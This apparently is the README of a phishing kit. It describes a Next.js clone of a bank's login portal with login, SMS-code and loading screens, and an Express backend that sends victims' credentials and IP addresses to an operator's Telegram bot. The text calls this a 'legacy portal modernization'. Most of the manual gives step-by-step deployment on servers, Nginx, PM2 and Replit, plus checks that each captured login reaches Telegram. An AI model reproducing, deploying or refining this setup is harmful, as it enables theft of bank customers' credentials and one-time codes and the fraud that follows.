# Banco Fullstack – Manual Operativo Completo

Este repositorio empaqueta la clonación del portal legacy (frontend) y su backend Node.js asociado. El objetivo es brindar una experiencia idéntica al legado, pero con un stack moderno que facilite el despliegue, la automatización y el mantenimiento.

---

## 1. Arquitectura general

**Qué hace el proyecto:** provee una interfaz idéntica al portal legacy del banco, pero sobre Next.js, y centraliza el envío de credenciales/IP hacia Telegram usando un backend Express. Esto permite mantener la apariencia antigua mientras se moderniza el despliegue y la lógica de servidor.

- **Frontend (`Espiperlou BDV/`)**: aplicación Next.js 15 (Turbopack) servida como SPA. Reproduce el HTML y CSS del sitio original, pero delega en servicios propios la obtención de credenciales y el enrutamiento.
- **Backend (`telegram-bot-api/`)**: servidor Express que expone endpoints REST para compartir credenciales de Telegram y resolver la IP de quien interactúa con la interfaz.
- **Scripts de orquestación (raíz)**: comandos npm que permiten instalar dependencias, levantar ambos servicios en conjunto o iniciar cada uno por separado.

Diagrama (simplificado):

```
Navegador ──▶ Next.js (Espiperlou BDV) ──▶ Express API (telegram-bot-api) ──▶ Telegram / ipapi
```

---

## 2. Requisitos previos

| Recurso | Versión mínima | Uso |
| --- | --- | --- |
| **Sistema operativo** | Windows 10+, macOS 12+, Ubuntu 20.04+ | Cualquier entorno con Node 18 funciona. |
| **Node.js** | 18 LTS o superior | Ejecución de Next.js y del backend Express. [Descarga](https://nodejs.org/en/download). |
| **npm** | 9 o superior | Gestión de dependencias y scripts. Se instala junto con Node.js. |
| **Git** | Opcional pero recomendado | Clonado y control de versiones. [Descarga](https://git-scm.com/downloads). |
| **Editor/IDE** | (VS Code, WebStorm, Vim, etc.) | Desarrollo y depuración. Ej.: [VS Code](https://code.visualstudio.com/download). |
| **Herramientas opcionales** | [nvm](https://github.com/nvm-sh/nvm) (gestor de versiones de Node), [PM2](https://pm2.keymetrics.io/) / systemd (para producción), [Postman](https://www.postman.com/downloads/) o `curl` (para probar la API) |

> Nota: No se suministra Docker ni imágenes de contenedor. Si deseas contenedores, deberás crear tus propios Dockerfile y pipeline.

---

## 3. Estructura del repositorio

```
.
├── Espiperlou BDV/           # Frontend Next.js (Turbopack)
├── telegram-bot-api/         # Backend Express + sesiones
├── package.json              # Scripts de orquestación desde la raíz
├── README.md                 # Este manual
├── start-dev.js              # Helper para levantar ambos servicios
└── ...                       # Otros archivos auxiliares
```

Archivos clave:

- `Espiperlou BDV/src/lib/remote.ts`: funciones que llaman al backend (`requestTelegramConfig`, `resolveIp`).
- `telegram-bot-api/server.js`: servidor Express con endpoints `/api/bot-credentials`, `/api/update-credentials` (solo en desarrollo) y `/health`.
- `Espiperlou BDV/src/app/*`: páginas Next.js que replican el HTML legacy.

---

## 4. Instalación inicial

0. **Instala las herramientas necesarias:** descarga e instala [Node.js](https://nodejs.org/en/download), [Git](https://git-scm.com/downloads) y, si lo prefieres, [VS Code](https://code.visualstudio.com/download) u otro IDE. Tras la instalación, abre una terminal nueva para asegurarte de que `node` y `npm` estén disponibles.

1. **Clona el repositorio (opcional si ya lo tienes):**
   ```bash
   git clone <URL-del-repo>
   cd banco
   ```

2. **Instala todas las dependencias (frontend y backend):**
   ```bash
   npm run install:all
   ```

   Este script ejecuta internamente `npm install` en `telegram-bot-api/` y en `Espiperlou BDV/`.

3. **Verifica la versión de Node y npm:**
   ```bash
   node -v
   npm -v
   ```
   Asegúrate de que coincidan con los requisitos listados arriba.

---

## 5. Configuración y variables de entorno

La aplicación funciona con valores por defecto para desarrollo. Para personalizarla (especialmente en producción), usa las siguientes variables:

| Variable | Ubicación | Descripción |
| --- | --- | --- |
| `PORT` | Backend | Puerto de Express (por defecto 3001). |
| `SESSION_SECRET` | Backend | Clave para firmar las cookies de sesión; usa un valor aleatorio y secreto en producción. |
| `ALLOWED_ORIGINS` | Backend | Lista separada por comas con los orígenes permitidos (ej. `https://portal.midominio.com`). |
| `NEXT_PUBLIC_BACKEND_URL` | Frontend | URL pública del backend. En desarrollo apunta a `http://localhost:3001`; en producción define el dominio o subdominio correspondiente. |

**Credenciales de Telegram**: en `telegram-bot-api/server.js` se inicializan `chat_id` y `token` dentro del middleware de sesión. Ajusta estos valores antes de subir a producción. En desarrollo puedes usar el endpoint `/api/update-credentials` para actualizarlos dinámicamente.

---

## 6. Scripts disponibles

### 6.1 Scripts en la raíz

Ejecuta estos comandos **desde la carpeta raíz del repositorio** (`c:/trabajos/TRABAJITOS/banco`).

| Comando | Descripción |
| --- | --- |
| `npm run install:all` | Ejecuta `npm install` en frontend y backend. |
| `npm run dev` | Levanta ambos servicios a la vez con `concurrently`. |
| `npm run start` | Levanta ambos servicios en modo producción (requiere `npm run build` en el frontend previamente). |
| `npm run dev:backend` | Atajo para `npm run dev` dentro de `telegram-bot-api/`. |
| `npm run dev:frontend` | Atajo para `npm run dev` dentro de `Espiperlou BDV/`. |
| `npm run kill` | Intenta terminar procesos Node residuales en Windows. |
| `npm run clean` | Ejecuta `npm run kill` y reinstala dependencias. |
| `npm run dev:safe` | Levanta ambos entornos mediante `start-dev.js` (útil si `concurrently` falla).

### 6.2 Scripts del backend (`telegram-bot-api/`)

Ejecuta estos comandos dentro de la carpeta `telegram-bot-api/`:

| Comando | Descripción |
| --- | --- |
| `npm run dev` | Inicia Express con `nodemon` (recarga automática). |
| `npm start` | Inicia Express con Node en modo producción. |

### 6.3 Scripts del frontend (`Espiperlou BDV/`)

Ejecuta estos comandos dentro de la carpeta `Espiperlou BDV/`:

| Comando | Descripción |
| --- | --- |
| `npm run dev` | Next.js dev server con Turbopack. |
| `npm run build` | Compila la aplicación para producción. |
| `npm start` | Sirve la build optimizada (usualmente en el puerto 3000). |
| `npm run lint` | Ejecuta ESLint. |

---

## 7. Flujo de desarrollo recomendado

1. **Inicia el backend**
   ```bash
   # desde la raíz del repositorio
   cd telegram-bot-api
   npm run dev
   ```
   Esto habilita http://localhost:3001 con recarga automática.

2. **Inicia el frontend** (en otra terminal)
   ```bash
   # abre una nueva terminal también desde la raíz
   cd "Espiperlou BDV"
   npm run dev
   ```
   Accede a http://localhost:3000. El frontend replica el HTML legacy y llama al backend para obtener credenciales.

3. **Depuración**
   - Usa la pestaña “Network” del navegador para verificar las llamadas a `/api/bot-credentials`.
   - Puedes simular otros entornos modificando `NEXT_PUBLIC_BACKEND_URL` y reiniciando el proceso.

4. **Lint opcional**
   ```bash
   cd "Espiperlou BDV"
   npm run lint
   ```

> Atajo: en la raíz basta con `npm run dev` para arrancar ambos procesos simultáneamente.

---

## 8. Construcción y despliegue

### 8.1 Construir el frontend

```bash
cd "Espiperlou BDV"
npm run build
```
Esto genera la carpeta `.next/` con los artefactos optimizados.

### 8.2 Ejecutar en modo producción

- **Backend** (terminal en la raíz)
  ```bash
  cd telegram-bot-api
  npm start
  ```
- **Frontend** (otra terminal en la raíz)
  ```bash
  cd "Espiperlou BDV"
  npm start
  ```

Por defecto el backend escucha en `http://localhost:3001` y el frontend en `http://localhost:3000`.

### 8.3 Recomendaciones para producción

1. **Estructura sugerida del servidor**
   ```text
   /opt/banco/
   |-- frontend/         # copia de `Espiperlou BDV/`
   |-- backend/          # copia de `telegram-bot-api/`
   |-- .env.frontend     # variables NEXT_PUBLIC_*
   `-- .env.backend      # SESSION_SECRET, PORT, etc.
   ```

2. **Variables de entorno**
   - Crea archivos `.env` o exporta las variables en tu gestor de procesos.
   - Ejemplo `.env.backend`:
     ```ini
     PORT=3001
     SESSION_SECRET="cadena-super-secreta"
     ALLOWED_ORIGINS="https://portal.midominio.com"
     CHAT_ID=xxxxxxxxx
     TELEGRAM_TOKEN=yyyyyyyy
     ```
   - Ejemplo `.env.frontend`:
     ```ini
     NEXT_PUBLIC_BACKEND_URL="https://api.midominio.com"
     ```
   - Si prefieres no fijar `CHAT_ID` y `TELEGRAM_TOKEN` en el código, léelos desde `process.env` en `server.js`.

3. **Proxy inverso (Nginx)**
   ```nginx
   server {
     server_name portal.midominio.com;

     location /api/ {
       proxy_pass http://127.0.0.1:3001/;
       proxy_set_header Host $host;
       proxy_set_header X-Real-IP $remote_addr;
     }

     location / {
       proxy_pass http://127.0.0.1:3000/;
       proxy_http_version 1.1;
       proxy_set_header Upgrade $http_upgrade;
       proxy_set_header Connection "upgrade";
       proxy_set_header Host $host;
     }
   }
   ```
   Emite certificados con Let's Encrypt (`certbot`) o tu CA y fuerza HTTPS (redirección 80→443 + HSTS).

4. **Gestión de procesos**
   - Con **PM2**:
     ```bash
     cd /opt/banco/backend
     pm2 start npm --name banco-backend -- run start
     cd /opt/banco/frontend
     pm2 start npm --name banco-frontend -- run start
     pm2 save
     ```
   - Con **systemd**: crea servicios en `/etc/systemd/system/` que ejecuten `npm start` en cada directorio y actívalos con `systemctl enable --now`.

5. **Despliegue continuo**
   - Automatiza con scripts o CI/CD: `git pull`, `npm install`, `npm run build` (frontend), reinicio de servicios.
   - Si necesitas portabilidad, genera imágenes Docker separadas para frontend y backend.

6. **Seguridad y monitoreo**
   - Redirige logs a archivos y configura rotación (`logrotate`).
   - Supervisa `/health` y añade alertas si el backend deja de responder.
   - `/api/update-credentials` solo se expone en desarrollo; verifica que `NODE_ENV` sea `production` en producción.

7. **Plan de contingencia**
   - Conserva backups de `SESSION_SECRET`, `CHAT_ID`, `TELEGRAM_TOKEN` y builds previas.
   - Documenta cada despliegue (fecha, cambios, responsable) y ten un proceso de rollback claro.
   - Prueba la aplicación después de cada release para asegurar que todas las rutas funcionan.


---

## 9. Troubleshooting (FAQ)

| Problema | Causa probable | Solución |
| --- | --- | --- |
| El frontend no carga credenciales | Backend apagado o `NEXT_PUBLIC_BACKEND_URL` incorrecto | Asegura que Express esté corriendo en `http://localhost:3001` y reinicia el frontend. |
| Error CORS en consola | El origen del frontend no está incluido en `ALLOWED_ORIGINS` | Actualiza la variable y reinicia el backend. |
| `npm run dev` (raíz) falla en Windows | La ruta con espacios puede romper `concurrently` | Usa `npm run dev:safe` o ejecuta los procesos por separado. |
| `npm run build` falla | Dependencias sin instalar o Node desactualizado | Ejecuta `npm run install:all` y confirma `node -v >= 18`. |
| Cambié `chat_id`/`token` y el frontend sigue usando los antiguos | La sesión persiste en el navegador | Limpia cookies o usa `/api/update-credentials` en desarrollo. |

---

## 10. Buenas prácticas de mantenimiento

- **Versionado**: mantén el repositorio en Git y crea ramas por feature/bugfix.
- **Backups**: guarda de forma segura los tokens de Telegram y secretos usados en producción.
- **Seguridad**: revisa periódicamente dependencias (`npm audit fix`), actualiza Node y aplica parches de Express/Next.
- **Documentación**: registra nuevos flujos o scripts que agregues sobre este manual.
- **Pruebas manuales**: antes de desplegar, repite el proceso de login en el frontend asegurando que las pantallas (`/`, `/sms`, `/cargando`, `/cargando2`) se comporten como el legacy original.

---

## 11. Flujo resumido

1. `npm run install:all`
2. `npm run dev` (o backend y frontend por separado)
3. Desarrolla/prueba en `http://localhost:3000`
4. Configura variables y actualiza credenciales
5. `npm run build` en `Espiperlou BDV/`
6. `npm start` (frontend) + `npm start` (backend) bajo un gestor de procesos
7. Coloca ambos detrás de un proxy HTTPS y monitorea `/health`

Con estos pasos tendrás una réplica del legacy lista para ejecutarse en local o en producción, reutilizando el backend Node.js y la interfaz Next.js que ya quedó alineada con el diseño original.
---

## 12. Ejecución en Replit (guía profesional)

### 12.1 Panorama general

- Replit solo mantiene un proceso HTTP por Repl, por lo que lo habitual es separar frontend y backend en dos proyectos. Como alternativa, puedes publicar un `build` estático del frontend y servirlo con Express en un único Repl.
- Todo el tráfico hacia Replit es HTTPS; las URLs se resuelven como `https://<nombre>-<usuario>.repl.co` o `replit.app`. Ajusta CORS y variables `NEXT_PUBLIC_BACKEND_URL` en consecuencia.
- Replit inyecta automáticamente `process.env.PORT`. No fuerces puertos ni utilices números fijos al desplegar ahí.

### 12.2 Backend (Express) en un Repl independiente

1. **Crear el Repl**: elige la plantilla "Node.js" y nómbralo, por ejemplo, `banco-backend`.
2. **Subir código**: copia únicamente el contenido de `telegram-bot-api/` (puedes arrastrar los archivos o conectar Git). Verifica que `package.json` y `server.js` estén en la raíz del Repl.
3. **Ajustar el código para producción**:
   - En `server.js`, reemplaza las credenciales fijas por lecturas a `process.env.CHAT_ID` y `process.env.TELEGRAM_TOKEN`.
   - Define un arreglo por defecto para `ALLOWED_ORIGINS`, pero prepárate para leer el valor definitivo desde `process.env.ALLOWED_ORIGINS`.
   - Asegúrate de que la opción `cookie.secure` se active cuando `NODE_ENV==='production'`.
4. **Configurar secretos** (Tools → Secrets):
   - `SESSION_SECRET`: cadena aleatoria larga.
   - `CHAT_ID` y `TELEGRAM_TOKEN`: datos reales del bot.
   - `ALLOWED_ORIGINS`: URL(s) exactas que consumirán la API (ej. `https://banco-frontend.<usuario>.replit.app`).
   - Opcional: `NODE_ENV=production` para endurecer cookies y evitar `/api/update-credentials`.
5. **Instalar dependencias**: abre la terminal del Repl y ejecuta `npm install`.
6. **Arrancar el backend**: corre `npm start`. Replit expondrá la aplicación y mostrará una URL pública.
7. **Verificaciones**:
   - `POST https://<dominio>/api/bot-credentials` debe devolver `chat_id` y `token`.
   - `GET https://<dominio>/health` debe responder `status: OK`.
   - Revisa la consola del Repl; corrige cualquier error de CORS o sesión antes de pasar al frontend.

### 12.3 Frontend (Next.js) en un Repl dedicado

1. **Crear el Repl**: usa nuevamente la plantilla "Node.js" (Next.js funciona sobre Node). Llama al proyecto `banco-frontend` para distinguirlo.
2. **Subir código**: copia la carpeta `Espiperlou BDV/` completa al Repl. Asegúrate de mantener `package.json`, `next.config.ts`, `src/` y `public/`.
3. **Configurar variables** (Tools → Secrets):
   - `NEXT_PUBLIC_BACKEND_URL=https://<dominio-del-backend>` (usa la URL HTTPS exacta del Repl del backend).
   - Si compilas en producción, también puedes fijar `NODE_ENV=production`.
4. **Instalar dependencias**: en la terminal del Repl ejecuta `npm install`.
5. **Elegir modo de ejecución**:
   - **Desarrollo**: `npm run dev` (ideal para validar el flujo antes de publicar). Replit mostrará el puerto activo y podrás revisar logs en tiempo real.
   - **Producción**: ejecuta `npm run build` seguido de `npm start` para servir la versión optimizada. Replit mantiene el proceso activo mientras la pestaña esté abierta o utilices el cron interno.
6. **Pruebas funcionales**:
   - Accede a la URL pública (`https://banco-frontend.<usuario>.replit.app`).
   - Reproduce el flujo de login y confirma que la solicitud a `/api/bot-credentials` responde 200 y que el mensaje se envía al bot.
   - Ante cualquier error CORS, revisa `ALLOWED_ORIGINS` en el backend y vuelve a desplegar.

### 12.4 Despliegue combinado (un solo Repl)

La version actual ya integra Next.js dentro del servidor Express (`telegram-bot-api/server.js`), por lo que puedes ejecutar todo desde un unico Repl:

1. Sube todo el repositorio al Repl o conecta el repo desde Git.
2. Instala dependencias en ambas carpetas:
   ```bash
   cd telegram-bot-api
   npm install
   cd ../"Espiperlou BDV"
   npm install
   ```
3. Define secretos en *Tools → Secrets* (o variables):
   - `SESSION_SECRET`, `CHAT_ID`, `TELEGRAM_TOKEN`
   - `ALLOWED_ORIGINS` (incluye la URL publica del Repl)
   - `NEXT_PUBLIC_BACKEND_URL` (puede quedar vacia; si lo configuras, usa la URL HTTPS del Repl sin barra final)
4. Modo desarrollo:
   ```bash
   cd telegram-bot-api
   npm start
   ```
   Express levantara la API y Next en modo dev desde la misma URL.
5. Modo produccion:
   ```bash
   cd "Espiperlou BDV"
   npm run build
   cd ../telegram-bot-api
   NODE_ENV=production npm start
   ```
   El build de Next sera reutilizado por Express y todo quedara expuesto en el mismo dominio.
6. Verifica `https://<dominio>/health`, `POST https://<dominio>/api/bot-credentials` y el flujo completo en el navegador.

> Si prefieres despliegues separados, sigue las secciones 12.2 y 12.3. El modo combinado es el camino rapido cuando todo vive en un solo Repl.
### 12.5 Checklist final

- [ ] Backups locales del código antes de subir a Replit.
- [ ] Variables de entorno cargadas en ambos Repl.
- [ ] `POST /api/bot-credentials` probado con `curl` o Postman.
- [ ] Flujo completo verificado en el navegador.
- [ ] Logs revisados y sin errores recurrentes.
- [ ] Mensajes confirmados en Telegram.

Siguiendo estos pasos tendrás el backend Express y el frontend Next.js operando en Replit con el mismo comportamiento que en local.

